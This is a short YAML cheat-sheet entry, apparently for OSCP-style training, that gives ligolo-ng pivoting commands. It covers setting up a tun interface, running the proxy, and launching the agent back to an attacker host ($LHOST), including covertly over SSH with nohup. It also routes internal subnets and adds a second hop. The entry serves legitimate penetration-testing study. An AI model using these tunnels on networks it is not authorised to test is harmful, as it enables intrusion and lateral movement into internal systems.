---
variants:
  - label: interface
    command: |
      sudo ip tuntap add user $(whoami) mode tun ligolo
      sudo ip link set ligolo up
  - label: proxy
    command: |
      ligolo-ng_proxy -selfcert -laddr 0.0.0.0:11601
  - label: agent
    command: |
      ./ligolo-ng -connect $LHOST:11601 -ignore-cert
  - label: agent-over-ssh
    command: |
      ssh $USER@$IP 'nohup /tmp/ligolo-ng -connect $LHOST:11601 -ignore-cert >/tmp/ligolo-ng.log 2>&1 </dev/null &'
  - label: route
    command: |
      sudo ip route add 172.16.5.0/24 dev ligolo
  - label: second-hop
    command: |
      sudo ip tuntap add user $(whoami) mode tun ligolo-hop2
      sudo ip link set ligolo-hop2 up
      sudo ip route add 172.16.6.0/24 dev ligolo-hop2
  - label: teardown
    command: |
      sudo ip link delete ligolo
description: Reverse tunnel that exposes remote subnets on a local tun interface, no proxychains needed
os: [Linux, Windows]
category: [oscp, cli]
phase: [Pivoting]
references:
  - https://github.com/nicocha30/ligolo-ng
---
